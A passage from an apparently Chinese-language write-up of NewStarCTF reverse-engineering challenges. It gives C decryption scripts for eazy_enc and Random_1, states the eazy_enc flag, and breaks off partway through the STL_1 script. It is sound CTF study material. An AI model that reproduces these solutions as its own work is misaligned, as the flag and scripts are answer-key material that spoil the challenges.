id="eazy-enc">eazy_enc</h2><p>使用了一个函数指针数组来进行多次加密:</p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231025185205159.png" alt="image-20231025185205159"></p><p>分别分析4个加密函数,最终决定对flag的每一个字符进行爆破,保持加密函数逻辑不变,对爆破的字符进行加密,最后检查是否匹配.</p><p>实际上后来发现上面的4个加密函数执行后,密文和明文并不是一一对应的(单射?),原因可能在于第四个加密中的<code>*=52</code>这个操作会有溢出,导致回绕:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231025185608304.png" alt="image-20231025185608304" style="zoom:50%;" /><p>实际可能不止这一处,懒得分析了(数学不太行),总之就是要把每一个可行的字符都输出来,尝试肉眼进行匹配(flag长度并不长,并且接近是一段英语).</p><p>解密脚本:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ctype.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">caesar</span><span class="params">(<span class="type">int</span> before_c, <span class="type">int</span> offset)</span> &#123;</span><br><span class="line">    <span class="type">int</span> c = before_c;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">isdigit</span>(c)) &#123;</span><br><span class="line">        <span class="keyword">while</span> (offset &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            offset += <span class="number">26</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">while</span> (offset &lt; <span class="number">0</span>)</span><br><span class="line">            offset += <span class="number">10</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">islower</span>(c)) &#123;</span><br><span class="line">        c = c + offset;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;a&#x27;</span> + (c - <span class="string">&#x27;a&#x27;</span>) % <span class="number">26</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">isupper</span>(c)) &#123;</span><br><span class="line">        c = c + offset;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;A&#x27;</span> + (c - <span class="string">&#x27;A&#x27;</span>) % <span class="number">26</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">isdigit</span>(c)) &#123;</span><br><span class="line">        c = c + offset;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;0&#x27;</span> + (c - <span class="string">&#x27;0&#x27;</span>) % <span class="number">10</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">return</span> (c);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">caesar2</span><span class="params">(<span class="type">int</span> before_c, <span class="type">int</span> offset, <span class="type">int</span> mod_num, <span class="type">int</span> base)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> (before_c + offset) % mod_num + base;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> enc[<span class="number">100</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    enc[<span class="number">0</span>] = <span class="number">-24</span>;</span><br><span class="line">    enc[<span class="number">1</span>] = <span class="number">0x80</span>;</span><br><span class="line">    enc[<span class="number">2</span>] = <span class="number">-124</span>;</span><br><span class="line">    enc[<span class="number">3</span>] = <span class="number">8</span>;</span><br><span class="line">    enc[<span class="number">4</span>] = <span class="number">24</span>;</span><br><span class="line">    <span class="built_in">strcpy</span>((<span class="type">char</span>*)&amp;enc[<span class="number">5</span>], <span class="string">&quot;&lt;xh&quot;</span>);</span><br><span class="line">    enc[<span class="number">9</span>] = <span class="number">112</span>;</span><br><span class="line">    enc[<span class="number">10</span>] = <span class="number">124</span>;</span><br><span class="line">    enc[<span class="number">11</span>] = <span class="number">-108</span>;</span><br><span class="line">    enc[<span class="number">12</span>] = <span class="number">-56</span>;</span><br><span class="line">    enc[<span class="number">13</span>] = <span class="number">-32</span>;</span><br><span class="line">    enc[<span class="number">14</span>] = <span class="number">16</span>;</span><br><span class="line">    enc[<span class="number">15</span>] = <span class="number">-20</span>;</span><br><span class="line">    enc[<span class="number">16</span>] = <span class="number">-76</span>;</span><br><span class="line">    enc[<span class="number">17</span>] = <span class="number">-84</span>;</span><br><span class="line">    enc[<span class="number">18</span>] = <span class="number">104</span>;</span><br><span class="line">    enc[<span class="number">19</span>] = <span class="number">-88</span>;</span><br><span class="line">    enc[<span class="number">20</span>] = <span class="number">12</span>;</span><br><span class="line">    enc[<span class="number">21</span>] = <span class="number">28</span>;</span><br><span class="line">    enc[<span class="number">22</span>] = <span class="number">-112</span>;</span><br><span class="line">    enc[<span class="number">23</span>] = <span class="number">-52</span>;</span><br><span class="line">    enc[<span class="number">24</span>] = <span class="number">84</span>;</span><br><span class="line">    enc[<span class="number">25</span>] = <span class="number">60</span>;</span><br><span class="line">    enc[<span class="number">26</span>] = <span class="number">20</span>;</span><br><span class="line">    enc[<span class="number">27</span>] = <span class="number">-36</span>;</span><br><span class="line">    enc[<span class="number">28</span>] = <span class="number">48</span>;</span><br><span class="line">    enc[<span class="number">29</span>] = <span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> len = <span class="number">29</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> key[] = <span class="string">&quot;NewStarCTF&quot;</span>;</span><br><span class="line">    <span class="type">int</span> key_len = <span class="built_in">strlen</span>(key);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;key_len = %d\n&quot;</span>,key_len);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;enc is:\n&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; len; ++i)</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>, enc[i]);</span><br><span class="line">    <span class="built_in">putchar</span>(<span class="string">&#x27;\n&#x27;</span>);</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> dec[<span class="number">100</span>];</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; len; ++i) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">unsigned</span> <span class="type">char</span> chr = <span class="number">0</span>; chr &lt;= <span class="number">128</span>; ++chr) &#123;</span><br><span class="line">            dec[i] = chr;</span><br><span class="line"></span><br><span class="line">            <span class="type">unsigned</span> <span class="type">char</span> temp = dec[i];</span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">isupper</span>(temp))</span><br><span class="line">                temp = caesar2(temp, <span class="number">-52</span>, <span class="number">26</span>, <span class="string">&#x27;A&#x27;</span>);</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">islower</span>(temp))</span><br><span class="line">                temp = caesar2(temp, <span class="number">-89</span>, <span class="number">26</span>, <span class="string">&#x27;a&#x27;</span>);</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">isdigit</span>(temp))</span><br><span class="line">                temp = caesar2(temp, <span class="number">-45</span>, <span class="number">10</span>, <span class="string">&#x27;0&#x27;</span>);</span><br><span class="line">            dec[i] = temp;</span><br><span class="line"></span><br><span class="line">            dec[i] += key[i % key_len];</span><br><span class="line">            dec[i] = ~(dec[i]);</span><br><span class="line">            dec[i] *= <span class="number">52</span>;</span><br><span class="line">            <span class="keyword">if</span> (dec[i] == enc[i] &amp;&amp; chr&gt;=<span class="number">30</span> &amp;&amp; chr&lt;=<span class="number">128</span>) &#123;</span><br><span class="line">                <span class="built_in">putchar</span>(chr);</span><br><span class="line">                <span class="comment">// break; // 这里的break;注释掉,以确保所有的匹配项都输出来</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">putchar</span>(<span class="string">&#x27;\n&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; len; ++i) &#123;</span><br><span class="line">        <span class="built_in">putchar</span>(dec[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">        暴力结果:</span></span><br><span class="line"><span class="comment">        B    B</span></span><br><span class="line"><span class="comment">        :r   r</span></span><br><span class="line"><span class="comment">        #u   u</span></span><br><span class="line"><span class="comment">        &quot;t   t</span></span><br><span class="line"><span class="comment">        -e   e</span></span><br><span class="line"><span class="comment">        F    F</span></span><br><span class="line"><span class="comment">        4o   4 o</span></span><br><span class="line"><span class="comment">        :r   r</span></span><br><span class="line"><span class="comment">        +c   c</span></span><br><span class="line"><span class="comment">        -e   e</span></span><br><span class="line"><span class="comment">        I    I</span></span><br><span class="line"><span class="comment">        !s   s</span></span><br><span class="line"><span class="comment">        A    A</span></span><br><span class="line"><span class="comment">        G    G</span></span><br><span class="line"><span class="comment">        4o   o</span></span><br><span class="line"><span class="comment">        4o   o</span></span><br><span class="line"><span class="comment">        ,d   d</span></span><br><span class="line"><span class="comment">        %w   w</span></span><br><span class="line"><span class="comment">        )a   a</span></span><br><span class="line"><span class="comment">        &#x27;y   y</span></span><br><span class="line"><span class="comment">        &quot;t   t</span></span><br><span class="line"><span class="comment">        4o   o</span></span><br><span class="line"><span class="comment">        G    G</span></span><br><span class="line"><span class="comment">        -e   e</span></span><br><span class="line"><span class="comment">        &quot;t   t</span></span><br><span class="line"><span class="comment">        F    F</span></span><br><span class="line"><span class="comment">        1l   l</span></span><br><span class="line"><span class="comment">        )a   a</span></span><br><span class="line"><span class="comment">        /g   g</span></span><br><span class="line"><span class="comment">        可知并不是一一映射的关系,可能有多解:</span></span><br><span class="line"><span class="comment">        整理猜测得出:(正解为第二个)</span></span><br><span class="line"><span class="comment">        BruteF4rceIsAGoodwaytoGetFlag</span></span><br><span class="line"><span class="comment">        BruteForceIsAGoodwaytoGetFlag</span></span><br><span class="line"><span class="comment">        即flag&#123;BruteForceIsAGoodwaytoGetFlag&#125;</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>flag简单地猜测即可得出.</p><h2 id="random-1">Random_1</h2><p>多余的话不说,main函数都能分析明白,关键就是找到这个伪随机的种子.</p><p>我们确定了程序的平台,编译环境,那么理论上我们只需要找到固定的随机数种子就能生成相同的伪随机数序列,进而实现解密,但是这个seed不好找…</p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/491d18626b30bcf14b6f8c49c2ee9a61.png" alt="491d18626b30bcf14b6f8c49c2ee9a61"></p><p>由于题解在很久之后才写,所以这里主要记录一下之前做的时候的一些过程思路,实际思考过程并不是像这篇题解这样的.</p><p>实际上我们从导入表进行交叉引用,慢慢找就能找到关键函数.</p><p>尝试了动调获取seed失败,我们能够知道这个程序是有反调试手段的,那么从这个角度出发,我们如果能找到反调试的部分在哪里,也许就能顺藤摸瓜找到seed这个种子究竟在哪里设置的.</p><p>经过分析某个该死的函数的IDA图形化交叉引用视图,这里忘了是哪个了,当时应该就是从那个<code>_srand()</code>函数出发的…</p><p>我们可以发现这个程序的反调试的手段在这个<code>_Z1av</code>指向的函数中:</p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/df3c1046e922e0563bb806abeaa1448e.png" alt="df3c1046e922e0563bb806abeaa1448e"></p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/7aff7b3313843ae0b4cbaf253569a99b.png" alt="7aff7b3313843ae0b4cbaf253569a99b"></p><p>我没记错的话这个a()函数就是<code>_Z1av</code>指向的函数(忘记了)</p><p>实际上就是从这里的这个函数进行依次调用的:</p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/df270215e2f8857ce183f1ffd817a8af.png" alt="df270215e2f8857ce183f1ffd817a8af"></p><p>依次调用了这个函数指针数组中保存的一系列函数,我们跟进去看就是前图那两个<code>_Z1av</code>和<code>_Z1bv</code>,虽然不知道为什么起这么个名字.</p><p>实际上这里看到我们要找的关键函数在<code>__init_array_start</code>中,这里就涉及到<code>init_array段</code>了,其中的函数调用早于main()函数,所以我们一下子找不到这个函数,但是他们确确实实地运行了,同样的还有<code>fini_array段</code>,其中的部分是在程序结束时执行的.</p><p>那么再往后看,第二个<code>_Z1bv</code>指向的函数同样跟进去一看,就发现这个函数里有种子了(记得这个就是对应着<code>_Z1bv</code>):</p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/c394bd16e43361f9a0c1604cb0a5a53d.png" alt="c394bd16e43361f9a0c1604cb0a5a53d"></p><p>那么种子有了,其他部分的加密很简单,直接写脚本就好,一定要在同样的环境下跑—Ubuntu22下运行</p><p>解密脚本:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="comment">//在ubuntu22下运行</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> s2[<span class="number">1000</span>];</span><br><span class="line">    <span class="type">long</span> <span class="type">long</span> *p = (<span class="type">long</span> <span class="type">long</span> *) s2;</span><br><span class="line">    p[<span class="number">0</span>] = <span class="number">0x3513AB8AB2D7E6EE</span>LL;</span><br><span class="line">    p[<span class="number">1</span>] = <span class="number">0x2EEDBA9CB9C97B02</span>LL;</span><br><span class="line">    p[<span class="number">2</span>] = <span class="number">0x16E4F8C8EEFA4FBD</span>LL;</span><br><span class="line">    p[<span class="number">3</span>] = <span class="number">0x383014F4983B6382</span>LL;</span><br><span class="line">    p[<span class="number">4</span>] = <span class="number">0xEA32360C3D843607</span>LL;</span><br><span class="line">    p[<span class="number">5</span>] = <span class="number">42581LL</span>;</span><br><span class="line">    p[<span class="number">6</span>] = <span class="number">0</span>;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> Table[] =</span><br><span class="line">            &#123;</span><br><span class="line">                    <span class="number">99</span>, <span class="number">124</span>, <span class="number">119</span>, <span class="number">123</span>, <span class="number">242</span>, <span class="number">107</span>, <span class="number">111</span>, <span class="number">197</span>, <span class="number">48</span>, <span class="number">1</span>,</span><br><span class="line">                    <span class="number">103</span>, <span class="number">43</span>, <span class="number">254</span>, <span class="number">215</span>, <span class="number">171</span>, <span class="number">118</span>, <span class="number">202</span>, <span class="number">130</span>, <span class="number">201</span>, <span class="number">125</span>,</span><br><span class="line">                    <span class="number">250</span>, <span class="number">89</span>, <span class="number">71</span>, <span class="number">240</span>, <span class="number">173</span>, <span class="number">212</span>, <span class="number">162</span>, <span class="number">175</span>, <span class="number">156</span>, <span class="number">164</span>,</span><br><span class="line">                    <span class="number">114</span>, <span class="number">192</span>, <span class="number">183</span>, <span class="number">253</span>, <span class="number">147</span>, <span class="number">38</span>, <span class="number">54</span>, <span class="number">63</span>, <span class="number">247</span>, <span class="number">204</span>,</span><br><span class="line">                    <span class="number">52</span>, <span class="number">165</span>, <span class="number">229</span>, <span class="number">241</span>, <span class="number">113</span>, <span class="number">216</span>, <span class="number">49</span>, <span class="number">21</span>, <span class="number">4</span>, <span class="number">199</span>,</span><br><span class="line">                    <span class="number">35</span>, <span class="number">195</span>, <span class="number">24</span>, <span class="number">150</span>, <span class="number">5</span>, <span class="number">154</span>, <span class="number">7</span>, <span class="number">18</span>, <span class="number">128</span>, <span class="number">226</span>,</span><br><span class="line">                    <span class="number">235</span>, <span class="number">39</span>, <span class="number">178</span>, <span class="number">117</span>, <span class="number">9</span>, <span class="number">131</span>, <span class="number">44</span>, <span class="number">26</span>, <span class="number">27</span>, <span class="number">110</span>,</span><br><span class="line">                    <span class="number">90</span>, <span class="number">160</span>, <span class="number">82</span>, <span class="number">59</span>, <span class="number">214</span>, <span class="number">179</span>, <span class="number">41</span>, <span class="number">227</span>, <span class="number">47</span>, <span class="number">132</span>,</span><br><span class="line">                    <span class="number">83</span>, <span class="number">209</span>, <span class="number">0</span>, <span class="number">237</span>, <span class="number">32</span>, <span class="number">252</span>, <span class="number">177</span>, <span class="number">91</span>, <span class="number">106</span>, <span class="number">203</span>,</span><br><span class="line">                    <span class="number">190</span>, <span class="number">57</span>, <span class="number">74</span>, <span class="number">76</span>, <span class="number">88</span>, <span class="number">207</span>, <span class="number">208</span>, <span class="number">239</span>, <span class="number">170</span>, <span class="number">251</span>,</span><br><span class="line">                    <span class="number">67</span>, <span class="number">77</span>, <span class="number">51</span>, <span class="number">133</span>, <span class="number">69</span>, <span class="number">249</span>, <span class="number">2</span>, <span class="number">127</span>, <span class="number">80</span>, <span class="number">60</span>,</span><br><span class="line">                    <span class="number">159</span>, <span class="number">168</span>, <span class="number">81</span>, <span class="number">163</span>, <span class="number">64</span>, <span class="number">143</span>, <span class="number">146</span>, <span class="number">157</span>, <span class="number">56</span>, <span class="number">245</span>,</span><br><span class="line">                    <span class="number">188</span>, <span class="number">182</span>, <span class="number">218</span>, <span class="number">33</span>, <span class="number">16</span>, <span class="number">255</span>, <span class="number">243</span>, <span class="number">210</span>, <span class="number">205</span>, <span class="number">12</span>,</span><br><span class="line">                    <span class="number">19</span>, <span class="number">236</span>, <span class="number">95</span>, <span class="number">151</span>, <span class="number">68</span>, <span class="number">23</span>, <span class="number">196</span>, <span class="number">167</span>, <span class="number">126</span>, <span class="number">61</span>,</span><br><span class="line">                    <span class="number">100</span>, <span class="number">93</span>, <span class="number">25</span>, <span class="number">115</span>, <span class="number">96</span>, <span class="number">129</span>, <span class="number">79</span>, <span class="number">220</span>, <span class="number">34</span>, <span class="number">42</span>,</span><br><span class="line">                    <span class="number">144</span>, <span class="number">136</span>, <span class="number">70</span>, <span class="number">238</span>, <span class="number">184</span>, <span class="number">20</span>, <span class="number">222</span>, <span class="number">94</span>, <span class="number">11</span>, <span class="number">219</span>,</span><br><span class="line">                    <span class="number">224</span>, <span class="number">50</span>, <span class="number">58</span>, <span class="number">10</span>, <span class="number">73</span>, <span class="number">6</span>, <span class="number">36</span>, <span class="number">92</span>, <span class="number">194</span>, <span class="number">211</span>,</span><br><span class="line">                    <span class="number">172</span>, <span class="number">98</span>, <span class="number">145</span>, <span class="number">149</span>, <span class="number">228</span>, <span class="number">121</span>, <span class="number">231</span>, <span class="number">200</span>, <span class="number">55</span>, <span class="number">109</span>,</span><br><span class="line">                    <span class="number">141</span>, <span class="number">213</span>, <span class="number">78</span>, <span class="number">169</span>, <span class="number">108</span>, <span class="number">86</span>, <span class="number">244</span>, <span class="number">234</span>, <span class="number">101</span>, <span class="number">122</span>,</span><br><span class="line">                    <span class="number">174</span>, <span class="number">8</span>, <span class="number">186</span>, <span class="number">120</span>, <span class="number">37</span>, <span class="number">46</span>, <span class="number">28</span>, <span class="number">166</span>, <span class="number">180</span>, <span class="number">198</span>,</span><br><span class="line">                    <span class="number">232</span>, <span class="number">221</span>, <span class="number">116</span>, <span class="number">31</span>, <span class="number">75</span>, <span class="number">189</span>, <span class="number">139</span>, <span class="number">138</span>, <span class="number">112</span>, <span class="number">62</span>,</span><br><span class="line">                    <span class="number">181</span>, <span class="number">102</span>, <span class="number">72</span>, <span class="number">3</span>, <span class="number">246</span>, <span class="number">14</span>, <span class="number">97</span>, <span class="number">53</span>, <span class="number">87</span>, <span class="number">185</span>,</span><br><span class="line">                    <span class="number">134</span>, <span class="number">193</span>, <span class="number">29</span>, <span class="number">158</span>, <span class="number">225</span>, <span class="number">248</span>, <span class="number">152</span>, <span class="number">17</span>, <span class="number">105</span>, <span class="number">217</span>,</span><br><span class="line">                    <span class="number">142</span>, <span class="number">148</span>, <span class="number">155</span>, <span class="number">30</span>, <span class="number">135</span>, <span class="number">233</span>, <span class="number">206</span>, <span class="number">85</span>, <span class="number">40</span>, <span class="number">223</span>,</span><br><span class="line">                    <span class="number">140</span>, <span class="number">161</span>, <span class="number">137</span>, <span class="number">13</span>, <span class="number">191</span>, <span class="number">230</span>, <span class="number">66</span>, <span class="number">104</span>, <span class="number">65</span>, <span class="number">153</span>,</span><br><span class="line">                    <span class="number">45</span>, <span class="number">15</span>, <span class="number">176</span>, <span class="number">84</span>, <span class="number">187</span>, <span class="number">22</span></span><br><span class="line">            &#125;;</span><br><span class="line">    <span class="type">int</span> len = <span class="built_in">strlen</span>((<span class="type">char</span> *) s2);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;len = %d\n&quot;</span>, len);</span><br><span class="line">    srand(<span class="number">1400333646</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; len; ++i) &#123;</span><br><span class="line">        <span class="type">int</span> rand_v4 = rand();</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">char</span> chr = <span class="number">0</span>; chr &gt;= <span class="number">0</span>; ++chr) &#123;</span><br><span class="line">            <span class="keyword">if</span> (Table[(<span class="type">unsigned</span> <span class="type">char</span>) (chr + rand_v4 % <span class="number">255</span>)] == s2[i]) &#123;</span><br><span class="line">                <span class="built_in">putchar</span>(chr);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>记得就是上面这个,应该没什么问题…</p><p>运行结果:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231025191743587.png" alt="image-20231025191743587" style="zoom:50%;" /><h2 id="stl-1">STL_1</h2><p>不知道STL是什么先去学c++吧…</p><p>这个题就是要能够读懂程序,STL经过编译后,IDA分析出来的函数名很长,实际上关键的就是那一点:</p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231025192248287.png" alt="image-20231025192248287"></p><p>熟悉c++的话这题代码分析起来没难度…</p><p>难点在于对加密过程进行逆向.</p><p>程序中先对字符串进行reverse,然后执行了若干位运算,重点是位运算.</p><p>最后的检查flag是否正确还有一部分位运算变换,并且是将4个字符(4字节)作为一个int进行解释,然后进行位操作的.</p><p>将一个int的32个位展开,逐步分析各个位操作,最终能整理出如何一点点的进行逆向,最终我们需要多步操作逐渐将这32个位分别进行还原,由于后来写的WP(其实是懒),逻辑直接放代码里了…</p><p>解密脚本:</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cctype&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">uint64_t</span> v15[<span class="number">11</span>];</span><br><span class="line">    <span class="type">uint32_t</span> 